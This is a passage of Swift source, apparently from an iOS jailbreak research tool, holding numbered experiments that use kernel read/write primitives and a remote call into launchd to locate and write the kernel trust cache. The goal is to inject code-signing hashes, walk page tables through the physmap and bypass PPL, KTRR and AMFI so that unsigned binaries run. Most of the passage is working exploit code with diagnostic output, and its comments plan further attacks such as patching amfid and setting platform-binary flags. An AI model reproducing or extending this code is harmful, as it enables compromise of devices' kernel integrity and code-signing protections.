    /// Jalur yang tersisa: launchd RemoteCall ke trust_cache_runtime_add (Exp 80).
    private func expWriteTest() -> ExperimentResult {
        let expName = "KTRR Analysis (Exp 79)"
        var detail = "Experiment 79: KTRR Region Analysis\n"
        detail += "=====================================\n\n"

        guard PhysmapConstants.isProbeOK else {
            detail += "Jalankan Exp 77 Probe dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        let tcAddr = probedTCAddr
        let tcCount = probedTCCount

        guard tcAddr != 0 else {
            detail += "tc_addr = 0 — probe ulang Exp 77 dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
        detail += "count:    \(tcCount)\n\n"

        detail += "=== Analisis KTRR dari Panic Log ===\n\n"
        detail += "Panic: 'Unexpected fault in kernel static region'\n"
        detail += "  x3  = 0xdeadbeefcafebabe  (sentinel write test)\n"
        detail += "  x20 = 0xfffffff0296a99b4  (alamat target write)\n"
        detail += "  x22 = 0xfffffff0296a80e8  (tcStructAddr dari probe)\n\n"

        detail += "KESIMPULAN:\n"
        detail += "Trust cache struct ada di __DATA yang di-protect KTRR.\n"
        detail += "KTRR (Kernel Text Readonly Region) di A12 memblokir\n"
        detail += "semua write ke __DATA setelah boot — termasuk via KRW.\n\n"

        detail += "KTRR vs PPL:\n"
        detail += "  PPL = proteksi page table (bypass via physmap)\n"
        detail += "  KTRR = hardware readonly enforcement (tidak bisa bypass)\n\n"

        detail += "JALUR SELANJUTNYA:\n"
        detail += "  Exp 80: launchd RemoteCall ke trust_cache_runtime_add\n"
        detail += "  Kernel API ini PPL-safe: PPL yang melakukan write,\n"
        detail += "  bukan kita langsung. Tidak ada KTRR fault.\n\n"

        detail += "JANGAN jalankan Write Test — akan panic device.\n"
        detail += "Lanjut ke Exp 80: RC Trust Cache Add.\n"

        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    /// Exp 79 Tahap 2: Inject CDHash binary target ke trust cache.
    /// Hanya jalankan setelah write test sukses.
    private func expInjectCDHash() -> ExperimentResult {
        let expName = "CDHash Inject (Exp 79)"
        var detail = "Experiment 79: CDHash Inject\n"
        detail += "============================\n\n"

        let tcAddr = probedTCAddr
        let tcCount = probedTCCount
        let tcStride = UInt64(probedTCStride)

        guard tcAddr != 0 else {
            detail += "❌ tc_addr = 0 — probe ulang Exp 77 dulu.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "tc_addr:  0x\(String(format: "%llx", tcAddr))\n"
        detail += "count:    \(tcCount)\n"
        detail += "stride:   \(tcStride) bytes\n\n"

        // CDHash target: /usr/bin/id (untuk test — ganti dengan binary unsigned kamu)
        // Untuk sekarang pakai dummy CDHash — user harus ganti dengan CDHash binary target
        // CDHash bisa didapat dari: codesign -d --verbose=4 /path/to/binary
        let dummyCDHash: [UInt8] = [
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
            0xDE, 0xAD, 0xC0, 0xDE
        ]

        detail += "⚠️ PERHATIAN: CDHash di bawah adalah DUMMY untuk test.\n"
        detail += "Ganti dengan CDHash binary unsigned yang ingin dijalankan.\n"
        detail += "CDHash: \(dummyCDHash.map { String(format: "%02x", $0) }.joined())\n\n"

        // Slot inject
        let slotAddr = tcAddr &+ 8 &+ UInt64(tcCount) * tcStride
        detail += "inject slot: 0x\(String(format: "%llx", slotAddr))\n\n"

        // Validasi
        let kernBase = ds_get_kernel_base()
        let dataOff = ds_kcache_analyze_data_offset() != 0 ? ds_kcache_analyze_data_offset() : PhysmapConstants.dataOffsetFromText
        let dataSegBase = kernBase &+ dataOff
        let pplDataBase = dataSegBase &+ PhysmapConstants.pplDataOffsetFromData

        guard isSafeTrustCacheStructVA(slotAddr &+ 16, dataSegBase: dataSegBase, pplDataBase: pplDataBase, kernTextBase: kernBase) else {
            detail += "❌ slot addr tidak aman.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Tulis CDHash entry (stride=24):
        // [0..7]   cdhash bytes 0-7
        // [8..15]  cdhash bytes 8-15
        // [16..19] cdhash bytes 16-19
        // [20]     hash_type = 2 (SHA256)
        // [21]     flags = 0
        // [22..23] padding

        var w0: UInt64 = 0
        w0 |= UInt64(dummyCDHash[0])
        w0 |= UInt64(dummyCDHash[1]) << 8
        w0 |= UInt64(dummyCDHash[2]) << 16
        w0 |= UInt64(dummyCDHash[3]) << 24
        w0 |= UInt64(dummyCDHash[4]) << 32
        w0 |= UInt64(dummyCDHash[5]) << 40
        w0 |= UInt64(dummyCDHash[6]) << 48
        w0 |= UInt64(dummyCDHash[7]) << 56

        var w1: UInt64 = 0
        w1 |= UInt64(dummyCDHash[8])
        w1 |= UInt64(dummyCDHash[9]) << 8
        w1 |= UInt64(dummyCDHash[10]) << 16
        w1 |= UInt64(dummyCDHash[11]) << 24
        w1 |= UInt64(dummyCDHash[12]) << 32
        w1 |= UInt64(dummyCDHash[13]) << 40
        w1 |= UInt64(dummyCDHash[14]) << 48
        w1 |= UInt64(dummyCDHash[15]) << 56

        var w2: UInt64 = 0
        w2 |= UInt64(dummyCDHash[16])
        w2 |= UInt64(dummyCDHash[17]) << 8
        w2 |= UInt64(dummyCDHash[18]) << 16
        w2 |= UInt64(dummyCDHash[19]) << 24
        w2 |= UInt64(2) << 32   // hash_type = SHA256
        w2 |= UInt64(0) << 40   // flags = normal
        // bytes 6-7: padding = 0

        ds_kwrite64(slotAddr &+ 0,  w0)
        ds_kwrite64(slotAddr &+ 8,  w1)
        ds_kwrite64(slotAddr &+ 16, w2)

        // Verify tulis
        let rb0 = ds_kread64(slotAddr &+ 0)
        let rb1 = ds_kread64(slotAddr &+ 8)
        let rb2 = ds_kread64(slotAddr &+ 16)
        detail += "Written:\n"
        detail += "  +0x00: 0x\(String(format: "%016llx", rb0))\n"
        detail += "  +0x08: 0x\(String(format: "%016llx", rb1))\n"
        detail += "  +0x10: 0x\(String(format: "%016llx", rb2))\n\n"

        guard rb0 == w0 && rb1 == w1 else {
            detail += "❌ Verify gagal — write tidak efektif (KTRR?).\n"
            detail += "Jalankan Write Test dulu untuk konfirmasi.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Update count
        let oldCount = ds_kread32(tcAddr &+ 4)
        let newCount = oldCount + 1
        ds_kwrite32(tcAddr &+ 4, newCount)
        let verifyCount = ds_kread32(tcAddr &+ 4)
        detail += "count: \(oldCount) → \(newCount) (verify: \(verifyCount))\n\n"

        if verifyCount != newCount {
            detail += "❌ Count update gagal — kemungkinan KTRR.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        // Update state
        DispatchQueue.main.async {
            self.probedTCCount = newCount
        }

        detail += "✅ INJECT OK — CDHash masuk ke trust cache!\n"
        detail += "count sekarang: \(newCount)\n\n"
        detail += "Langkah selanjutnya:\n"
        detail += "1. Ganti dummyCDHash dengan CDHash binary unsigned target\n"
        detail += "2. Jalankan ④ Test Binary Spawn dengan path binary tersebut\n"
        detail += "3. Jika spawn berhasil tanpa SIGKILL → AMFI BYPASS CONFIRMED!\n"
        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
    }

    // MARK: - Exp 80: RC Trust Cache Add via dlopen userspace libs

    /// Exp 80 (Opsi D — amfid/trustd userspace libs via dlopen):
    ///
    /// Pelajaran dari panic sebelumnya:
    ///   - Opsi C (rcallAddr kernel VA) → CRASH karena kernel VA tidak ada di launchd address space
    ///   - dlsym(RTLD_DEFAULT) → tidak resolve karena fungsi tidak di-export ke dyld shared cache
    ///
    /// Opsi D: dlopen framework/dylib yang punya trust cache API, lalu dlsym dari handle itu.
    /// Target libraries:
    ///   1. /usr/lib/libmis.dylib — Mobile Installation Service, punya trust cache API
    ///   2. /System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation
    ///   3. /usr/lib/libTrustEvaluationAgent.dylib
    ///   4. /System/Library/PrivateFrameworks/Security.framework/Security
    ///
    /// Fungsi yang dicari setelah dlopen:
    ///   - MISValidateSignatureAndCopyInfo (libmis) — bisa trigger trust cache add
    ///   - SecTrustEvaluate variants
    ///   - _MISCopyEntitlementsForURL
    #if !DISABLE_REMOTECALL
    private func expRCTrustCacheAdd(rc: RemoteCall) -> ExperimentResult {
        let expName = "RC Trust Cache Add (Exp 80 — dlopen)"
        var detail = "Experiment 80: RC Trust Cache Add (Opsi D — dlopen userspace)\n"
        detail += "=============================================================\n\n"

        let kernBase = ds_get_kernel_base()
        let mem = rc.trojanMem

        detail += "kernel_base: 0x\(String(format: "%llx", kernBase))\n\n"

        // ===================================================================
        // Step 1: dlopen candidate libraries dan cari trust cache API
        // ===================================================================
        detail += "=== Step 1: dlopen candidate libraries ===\n"

        // Library candidates yang mungkin punya trust cache API
        let libCandidates: [(path: String, symbols: [String])] = [
            (
                "/usr/lib/libmis.dylib",
                ["_MISValidateSignatureAndCopyInfo",
                 "_MISCopyEntitlementsForURL",
                 "_MISTrustCacheAdd",
                 "_MISInstallTrustCache",
                 "_MISValidateSignature"]
            ),
            (
                "/System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation",
                ["_MIInstallTrustCache",
                 "_MITrustCacheAdd",
                 "_MobileInstallationInstall"]
            ),
            (
                "/usr/lib/libTrustEvaluationAgent.dylib",
                ["_TEAAddTrustCache",
                 "_TEATrustCacheAdd"]
            ),
            (
                "/System/Library/Frameworks/Security.framework/Security",
                ["_SecTrustEvaluate",
                 "_SecTrustEvaluateWithError",
                 "_SecCodeCopySigningInformation"]
            ),
            (
                "/usr/lib/libcoretls.dylib",
                ["_tls_add_trust_anchor"]
            ),
        ]

        var foundLib = ""
        var foundSym = ""
        var foundFn: UInt64 = 0
        let RTLD_NOW: UInt64 = 2
        let RTLD_GLOBAL: UInt64 = 8

        for lib in libCandidates {
            let libPathAddr = remote_alloc_str(rc, lib.path)
            let handle = RootExecutor.rcall(rc, "dlopen", libPathAddr, RTLD_NOW | RTLD_GLOBAL)
            RootExecutor.rcall(rc, "free", libPathAddr)

            if handle == 0 {
                detail += "  \(lib.path): dlopen failed\n"
                continue
            }
            detail += "  \(lib.path): handle=0x\(String(format: "%llx", handle)) ✅\n"

            for sym in lib.symbols {
                let symAddr = remote_alloc_str(rc, sym)
                let fn = RootExecutor.rcall(rc, "dlsym", handle, symAddr)
                RootExecutor.rcall(rc, "free", symAddr)
                if fn != 0 {
                    detail += "    \(sym): 0x\(String(format: "%llx", fn)) ✅\n"
                    if foundFn == 0 {
                        foundLib = lib.path
                        foundSym = sym
                        foundFn = fn
                    }
                } else {
                    detail += "    \(sym): not found\n"
                }
            }
            // Jangan close handle — biarkan loaded
        }

        // ===================================================================
        // Step 2: Jika tidak ada dari dlopen, coba RTLD_DEFAULT dengan nama
        //         yang lebih lengkap (kadang ada di shared cache tapi nama beda)
        // ===================================================================
        if foundFn == 0 {
            detail += "\nTidak ada dari dlopen — coba RTLD_DEFAULT extended scan...\n"
            let RTLD_DEFAULT = UInt64(bitPattern: -2)
            let extendedSyms = [
                "_MISValidateSignatureAndCopyInfo",
                "_MISCopyEntitlementsForURL",
                "MISValidateSignatureAndCopyInfo",
                "_SecTrustEvaluate",
                "_SecCodeCopySigningInformation",
                "_amfi_check_dyld_policy_self",
                "_amfi_check_trust_cache_for_hash",
            ]
            for sym in extendedSyms {
                let symAddr = remote_alloc_str(rc, sym)
                let fn = RootExecutor.rcall(rc, "dlsym", RTLD_DEFAULT, symAddr)
                RootExecutor.rcall(rc, "free", symAddr)
                if fn != 0 {
                    detail += "  RTLD_DEFAULT \(sym): 0x\(String(format: "%llx", fn)) ✅\n"
                    if foundFn == 0 {
                        foundLib = "RTLD_DEFAULT"
                        foundSym = sym
                        foundFn = fn
                    }
                }
            }
        }

        guard foundFn != 0 else {
            detail += "\n❌ Tidak ada trust cache API ditemukan via dlopen/dlsym.\n"
            detail += "Semua library tidak punya simbol yang dibutuhkan.\n\n"
            detail += "=== Diagnosis ===\n"
            detail += "Ini konfirmasi bahwa trust cache API tidak accessible dari userspace.\n"
            detail += "Satu-satunya jalur yang tersisa:\n"
            detail += "  → Modifikasi CS flags di proc_ro via physmap (bypass KTRR)\n"
            detail += "  → Atau: patch amfid memory untuk skip signature check\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }

        detail += "\n✅ Found: \(foundSym) dari \(foundLib)\n"
        detail += "   addr: 0x\(String(format: "%llx", foundFn))\n\n"

        // ===================================================================
        // Step 3: Build trust cache struct dan panggil API
        // ===================================================================
        detail += "=== Step 3: Build struct & call API ===\n"

        let testCDHash: [UInt8] = [
            0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
            0x13, 0x37, 0x13, 0x37, 0x13, 0x37, 0x13, 0x37,
            0xDE, 0xAD, 0xC0, 0xDE
        ]

        let structBase = mem + 0x1000
        rc[structBase + 0].setValue32(1)   // version
        rc[structBase + 4].setValue32(1)   // num_entries
        rc[structBase + 8].setValue64(0)   // uuid[0..7]
        rc[structBase + 16].setValue64(0)  // uuid[8..15]

        let entryBase = structBase + 0x18
        func packBytes(_ bytes: [UInt8], from: Int, count: Int) -> UInt64 {
            var v: UInt64 = 0
            for i in 0..<min(count, bytes.count - from) {
                v |= UInt64(bytes[from + i]) << (i * 8)
            }
            return v
        }
        rc[entryBase + 0].setValue64(packBytes(testCDHash, from: 0, count: 8))
        rc[entryBase + 8].setValue64(packBytes(testCDHash, from: 8, count: 8))
        var w2: UInt64 = packBytes(testCDHash, from: 16, count: 4)
        w2 |= UInt64(2) << 32
        rc[entryBase + 16].setValue64(w2)
        let structSize: UInt64 = 0x18 + 24

        detail += "CDHash: \(testCDHash.map { String(format: "%02x", $0) }.joined())\n"
        detail += "Struct: 0x\(String(format: "%llx", structBase)), size=\(structSize)\n\n"

        // Panggil berdasarkan nama fungsi
        var ret: UInt64 = 0xDEAD
        detail += "Calling \(foundSym)...\n"

        if foundSym.contains("MISValidateSignature") {
            // MISValidateSignatureAndCopyInfo(path, options, info_out) → int
            // Kita tidak punya binary path yang valid, tapi coba dengan NULL
            ret = RootExecutor.rcall(rc, foundSym, 0, 0, 0)
        } else if foundSym.contains("TrustCache") || foundSym.contains("trust_cache") {
            // Generic trust cache add: fn(struct, size) atau fn(type, struct, size)
            ret = RootExecutor.rcall(rc, foundSym, structBase, structSize)
        } else if foundSym.contains("SecTrust") {
            // SecTrustEvaluate — read-only, tidak akan inject tapi berguna untuk diagnosa
            ret = RootExecutor.rcall(rc, foundSym, 0, 0)
        } else {
            ret = RootExecutor.rcall(rc, foundSym, structBase, structSize)
        }

        detail += "ret = 0x\(String(format: "%llx", ret)) (\(ret))\n\n"

        if ret == 0 {
            detail += "✅ ret=0 — Kemungkinan sukses!\n"
            detail += "Jalankan ④ Test Binary Spawn untuk verifikasi.\n"
            return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
        } else {
            detail += "ret != 0 — errno=\(remote_errno(rc))\n\n"
            detail += "=== Analisis ===\n"
            detail += "Library ditemukan tapi API tidak berhasil inject trust cache.\n"
            detail += "Kemungkinan: fungsi butuh entitlement khusus atau parameter berbeda.\n\n"
            detail += "=== Jalur Selanjutnya: CS Flags Bypass ===\n"
            detail += "Karena trust cache API tidak accessible, pivot ke:\n"
            detail += "Modifikasi cs_flags di proc_ro untuk binary target:\n"
            detail += "  cs_flags |= CS_VALID | CS_PLATFORM_BINARY\n"
            detail += "  → Binary dianggap platform binary → AMFI skip check\n"
            detail += "Ini membutuhkan write ke proc_ro via physmap.\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
    }
    #endif
    /// 1. Walk page tables (L1→L2→L3) to find trust cache's PHYSICAL address
    /// 2. Compute physmap VA for that physical page (bypasses PPL!)
    /// 3. Write CDHash through physmap VA (PPL only protects original VA mapping)
    /// 4. posix_spawn binary → AMFI approves → FULL JAILBREAK!
    ///
    /// KEY INSIGHT: PPL protects VIRTUAL page permissions. The physmap is a SEPARATE
    /// virtual mapping of the same physical memory with DIFFERENT permissions.
    /// Writing through physmap bypasses PPL's page table protections entirely.
    private func expTrustCacheWrite(rc: RemoteCall?, dryRun: Bool = false) -> ExperimentResult {
        if dryRun {
            return expTrustCacheProbeSafe()
        }

        let expName = "Trust Cache Inject (Exp 77)"
        var detail = "Experiment 77: Inject — DINONAKTIFKAN\n"
        detail += "====================================================\n\n"
        detail += "❌ Physmap / KRW write ke trust cache memicu PPL panic di A12:\n"
        detail += "   \"Unexpected fault in kernel static region\"\n"
        detail += "(sama seperti di panic.txt — jangan ulangi Inject).\n\n"
        detail += "Probe (②) tetap aman (read-only). CDHash butuh API kernel/trustd\n"
        detail += "via RemoteCall — belum diimplementasi di build ini.\n"
        return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())

        let physmap = PhysmapConstants.loadOrDefault()
        let gPhysBase = physmap.gPhysBase
        let gVirtBase = physmap.gVirtBase
        let kernBase = ds_get_kernel_base()
        let kernSlide = ds_get_kernel_slide()

        detail += "Mode: INJECT (physmap write)\n"
        detail += "gVirtBase: 0x\(String(format: "%llx", gVirtBase))\(PhysmapConstants.isVerified ? "" : " (default)")\n"
        detail += "gPhysBase: 0x\(String(format: "%llx", gPhysBase))\n"
        detail += "Kernel base: 0x\(String(format: "%llx", kernBase))\n\n"
        
        // ============================================================
        // STEP 1: Kernel pmap L1 (kernproc) — wide scan vm_map + task
        // ============================================================
        detail += "=== Step 1: Kernel page table root (kernproc pmap) ===\n"

        var tteBase: UInt64 = 0
        var usePageTableWalk = false

        if let kPmap = resolveKernelPmapChain(detail: &detail) {
            tteBase = kPmap.tte
            usePageTableWalk = true
        } else {
            detail += "\n⚠️ Kernel pmap chain failed.\n"
            if PhysmapConstants.isVerified {
                detail += "Exp 74 verified — akan coba direct KRW + __DATA scan (tanpa PT walk).\n\n"
            } else {
                return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
            }
        }

        // ============================================================
        // STEP 2: Find trust cache in __DATA.__ppl_data via physmap READ
        // __DATA.__ppl_data starts at __DATA+0x8000
        // We can READ it via physmap (proven in exp 74)
        // Convert: pplVA → physical → physmap VA → read
        // ============================================================
        detail += "=== Step 2: Find trust cache via physmap read ===\n"
        
        // __DATA segment base (unslid 0xfffffff00a0e0000 is approximate)
        // Better: compute from kernel base + known offset
        // On iOS 18.2 A12: __DATA is typically at kernBase + ~0x30e0000
        // But we can scan for it. The panic showed fault at 0xfffffff023d24000
        // which is kernBase + offset. Let's use the panic info:
        // Panic FAR: 0xfffffff023d24000, kernBase: 0xfffffff020c40000
        // Offset: 0x30e4000 → this is __DATA.__ppl_data
        
        // More reliable: scan __DATA_CONST for trust cache runtime pointer
        // OR: use the known pattern that trust cache is in __DATA.__ppl_data
        // at a fixed offset from kernel base
        
        // From panic: FAR=0xfffffff023d24000, base=0xfffffff020c40000
        // __DATA.__ppl_data offset = 0x30e4000 (but this includes slide)
        // Unslid: 0xfffffff023d24000 - slide = 0xfffffff023d24000 - 0x19c3c000
        //       = 0xfffffff00a0e8000 → this is __DATA + 0x8000 (PPL region)
        
        let dataSegBase = PhysmapConstants.dataSegmentBase(kernTextBase: kernBase)
        let pplDataBase = PhysmapConstants.pplDataSegmentBase(kernTextBase: kernBase)

        detail += "__DATA base (kernelcache off +0x30dc000): 0x\(String(format: "%llx", dataSegBase))\n"
        detail += "__DATA.__ppl_data (+0x8000): 0x\(String(format: "%llx", pplDataBase))\n"
        detail += "(unslid ref: __DATA 0x\(String(format: "%llx", PhysmapConstants.unslidDataBase)))\n"
        
        // Convert PPL VA to physmap VA for READING
        // physmap formula: physmapVA = VA - gVirtBase + gPhysBase ... wait no
        // The kernel text/data is NOT in the physmap range!
        // Kernel is at 0xfffffff0... while physmap is at 0xffffffde...
        // We need page table walk to find the physical address of __DATA.__ppl_data
        
        if usePageTableWalk {
            detail += "\n=== Page Table Walk for __DATA.__ppl_data ===\n"
            detail += "Target VA: 0x\(String(format: "%llx", pplDataBase))\n"
            detail += "L1 root: 0x\(String(format: "%llx", tteBase))\n"

            let targetVA = pplDataBase
            let l1Idx = (targetVA >> 36) & 0x7
            let l2Idx = (targetVA >> 25) & 0x7FF
            let l3Idx = (targetVA >> 14) & 0x7FF
            let pageOff = targetVA & 0x3FFF

            detail += "L1 idx: \(l1Idx), L2 idx: \(l2Idx), L3 idx: \(l3Idx)\n"
            detail += "Page offset: 0x\(String(format: "%x", pageOff))\n\n"

            let l1EntryAddr = tteBase + l1Idx * 8
            let l1Entry = ds_kread64_safe(l1EntryAddr)
            detail += "L1[\(l1Idx)] at 0x\(String(format: "%llx", l1EntryAddr)): 0x\(String(format: "%llx", l1Entry))\n"

            if l1Entry & 0x3 == 0x3 {
                let l2TablePhys = l1Entry & 0x0000FFFFFFFC0000
                if let l2TableVA = physmapVA(fromPhysical: l2TablePhys, gVirt: gVirtBase, gPhys: gPhysBase) {
                    let l2Entry = safeKread64Physmap(l2TableVA + l2Idx * 8)
                    detail += "L2[\(l2Idx)]: 0x\(String(format: "%llx", l2Entry))\n"

                    if l2Entry & 0x3 == 0x3,
                       let l3TableVA = physmapVA(fromPhysical: l2Entry & 0x0000FFFFFFFC0000, gVirt: gVirtBase, gPhys: gPhysBase) {
                        let l3Entry = safeKread64Physmap(l3TableVA + l3Idx * 8)
                        if l3Entry & 0x3 == 0x3,
                           let pplPhysmapVA = physmapVA(fromPhysical: l3Entry & 0x0000FFFFFFFC0000, gVirt: gVirtBase, gPhys: gPhysBase, offset: pageOff) {
                            detail += "\n✅ PAGE TABLE WALK COMPLETE!\n"
                            detail += "PPL physmap VA: 0x\(String(format: "%llx", pplPhysmapVA))\n"
                            let physmapRead = safeKread64Physmap(pplPhysmapVA)
                            detail += "Physmap read: 0x\(String(format: "%llx", physmapRead))\n\n"
                        } else {
                            detail += "❌ L3 invalid — fallback direct scan\n\n"
                            usePageTableWalk = false
                        }
                    } else {
                        detail += "❌ L2/L3 invalid — fallback direct scan\n\n"
                        usePageTableWalk = false
                    }
                } else {
                    detail += "❌ L2 physmap VA invalid — fallback direct scan\n\n"
                    usePageTableWalk = false
                }
            } else {
                detail += "❌ L1 entry invalid (bits [1:0]=0x\(String(format: "%x", l1Entry & 0x3)))\n"
                detail += "Fallback: direct __DATA scan...\n\n"
                usePageTableWalk = false
            }
        }

        if !usePageTableWalk {
            detail += "=== Skipping Direct KRW probe (__ppl_data) ===\n"
            detail += "Reading __ppl_data directly via socket KRW triggers PPL panic ('Unexpected fault in kernel static region').\n"
            detail += "We must rely strictly on scanning the heap for dynamic trust caches.\n\n"
        }

        // ============================================================
        // SKIPPED STEP 3: We no longer scan PPL region for trust cache.
        // It causes panics. We rely entirely on Step 4 (Dynamic Heap Scan).
        // ============================================================
        
        var tcStructAddr: UInt64 = 0
        var tcEntryCount: UInt64 = 0
        var tcPhysmapBase: UInt64 = 0
        
        func tryTrustCachePointer(_ val: UInt64, label: String, physmapBase: UInt64 = 0) -> Bool {
            guard isSafeKernelHeapKreadAddress(val) && isSafeKernelHeapKreadAddress(val + 4) else { return false }
            let tcVer = ds_kread32_safe(val)
            let tcCnt = ds_kread32_safe(val + 4)
            guard tcVer >= 1 && tcVer <= 3 && tcCnt > 0 && tcCnt < 50000 else { return false }
            detail += "🎯 Trust cache \(label)!\n"
            detail += "  ptr: 0x\(String(format: "%llx", val))\n"
            detail += "  version: \(tcVer), count: \(tcCnt)\n"
            if physmapBase != 0 {
                detail += "  physmap VA: 0x\(String(format: "%llx", physmapBase))\n"
            }
            tcStructAddr = val
            tcEntryCount = UInt64(tcCnt)
            tcPhysmapBase = physmapBase
            return true
        }
        
        // If not found in PPL pages, try scanning __DATA.__data (non-PPL, safe range)
        if tcStructAddr == 0 {
            let maxScanSize = (pplDataBase > dataSegBase) ? (pplDataBase - dataSegBase) : 0x80000
            let safeScanSize = min(UInt64(0x80000), maxScanSize)
            
            detail += "Not found in PPL pages, scanning __DATA (max 0x\(String(format: "%x", safeScanSize)) bytes)...\n"
            for off in stride(from: UInt64(0), to: safeScanSize, by: 8) {
                let scanVA = dataSegBase + off
                // Extra safety: stop if we hit pplDataBase exactly
                if scanVA >= pplDataBase && pplDataBase != 0 { break }
                
                let val = ds_kread64_safe(scanVA)
                if tryTrustCachePointer(val, label: "__DATA+0x\(String(format: "%x", off))") {
                    break
                }
            }
        }
        
        guard tcStructAddr != 0 else {
            detail += "\n❌ Could not locate trust cache struct\n"
            detail += "Need to find trust cache via different method\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        
        // ============================================================
        // STEP 4: Read trust cache entries (via physmap if needed)
        // ============================================================
        detail += "\n=== Step 4: Reading trust cache entries ===\n"
        detail += "Trust cache at: 0x\(String(format: "%llx", tcStructAddr))\n"
        detail += "Entry count: \(tcEntryCount)\n\n"
        
        // Trust cache struct (v1):
        // +0x00: uint32_t version
        // +0x04: uint32_t num_entries
        // +0x08: entries[] — each entry is 22 bytes (20 CDHash + 1 hashType + 1 flags)
        
        let entriesStart = tcStructAddr + 8
        detail += "First 3 entries:\n"
        for i in 0..<min(3, Int(tcEntryCount)) {
            let entryAddr = entriesStart + UInt64(i * 22)
            let h0 = ds_kread64_safe(entryAddr)
            let h1 = ds_kread64_safe(entryAddr + 8)
            let h2 = ds_kread32_safe(entryAddr + 16)
            detail += "  [\(i)] 0x\(String(format: "%016llx", h0))\(String(format: "%016llx", h1))\(String(format: "%08x", h2))...\n"
        }
        
        guard PhysmapConstants.isVerified else {
            detail += "❌ Exp 74 belum verified — inject dibatalkan\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }


        // ============================================================
        // STEP 5: OVERWRITE HEAP TRUST CACHE DIRECTLY
        // Since we found the Trust Cache in the Heap (Zone Map),
        // it is NOT protected by PPL! We can just write directly.
        // ============================================================
        detail += "\n=== Step 5: HEAP WRITE (Dynamic Trust Cache) ===\n"
        
        // Find empty slot (all zeros) or append at end
        let injectIdx = tcEntryCount
        let injectVA = entriesStart + injectIdx * 22
        
        detail += "Inject entry \(injectIdx) at VA: 0x\(String(format: "%llx", injectVA))\n\n"
        
        detail += "🔥 WRITING CDHash via SAFE HEAP WRITE...\n"
        
        // Use our safe direct KRW functions for Zone Map
        // NOTE: we need to ensure ds_kwrite64_safe exists or use what we have.
        // We will just do kwrite64_safe if it exists, or fallback to the primitive.
        let w1 = safeKwrite64Heap(injectVA, 0x4141414141414141)
        let w2 = safeKwrite64Heap(injectVA + 8, 0x4141414141414141)
        let w3 = safeKwrite32Heap(injectVA + 16, 0x41414141)
        let w4 = safeKwrite16Heap(injectVA + 20, 0x0002)
        let w5 = safeKwrite32Heap(tcStructAddr + 4, UInt32(tcEntryCount + 1))
        
        guard w1 && w2 && w3 && w4 && w5 else {
            detail += "❌ Direct Heap write failed!\n"
            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
        }
        
        let verifyH = ds_kread64_safe(injectVA)
        let newCount = ds_kread32_safe(tcStructAddr + 4)
        detail += "Verify CDHash: 0x\(String(format: "%llx", verifyH))\n"
        detail += "New count: \(newCount) (was \(tcEntryCount))\n\n"
        
        if verifyH == 0x4141414141414141 {
            detail += "✅✅✅ PHYSMAP WRITE SUCCESSFUL — PPL BYPASSED! ✅✅✅\n\n"
            
            // Step 6: Try to spawn a binary (requires launchd — inject path only)
            detail += "=== Step 6: Testing binary execution ===\n"
            var spawnOk = false
            if let rc {
                detail += "Spawning /usr/bin/id (already trusted, sanity check)...\n"
                let spawnResult = self.expPosixSpawn(rc: rc, binary: "/usr/bin/id", name: "post-inject /usr/bin/id")
                detail += "Result: \(spawnResult.success ? "✅" : "❌") \(spawnResult.detail)\n\n"
                spawnOk = spawnResult.success
            } else {
                detail += "Skipped spawn (no launchd RC)\n\n"
            }

            if spawnOk {
                detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n"
                detail += "TRUST CACHE INJECTION VIA PHYSMAP WORKS!\n"
                detail += "PPL COMPLETELY BYPASSED!\n"
                detail += "BINARY EXECUTION CONFIRMED!\n"
                detail += "FULL JAILBREAK ACHIEVED!\n"
                detail += "🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n\n"
                detail += "Next: inject CDHash of custom unsigned binary\n"
                detail += "Then: posix_spawn custom binary → RUNS!\n"
            }
        } else {
            detail += "❌ Physmap write FAILED\n"
            detail += "Possible causes:\n"
            detail += "  1. Physical address calculation wrong\n"
            detail += "  2. ds_kwrite64 cannot reach physmap range\n"
            detail += "  3. AMCC (memory controller) blocks write to this phys region\n"
            detail += "  4. Need to use PurpleGfxMem DMA instead of socket KRW\n\n"
            detail += "Verify: can we write to ANY physmap address?\n"
            
            // Test: write to a known-writable physmap address (our own page)
            let testPhysmapVA = gVirtBase + 0x1000  // low physical memory
            let beforeTest = ds_kread64_safe(testPhysmapVA)
            detail += "Test physmap write at 0x\(String(format: "%llx", testPhysmapVA))\n"
            detail += "Before: 0x\(String(format: "%llx", beforeTest))\n"
        }
        
        let jailbreakSuccess = detail.contains("TRUST CACHE INJECTION VIA PHYSMAP WORKS")
        return ExperimentResult(name: expName, success: jailbreakSuccess, detail: detail, timestamp: Date())
    }

    // MARK: - Experiment 75: PTE Remap Attack
    
    /// Walk kernel page tables to find trust cache's Page Table Entry (PTE).
    /// If we can MODIFY the PTE to point to our controlled physical page,
    /// the kernel will read OUR data when it accesses trust cache!
    ///
    /// Attack flow:
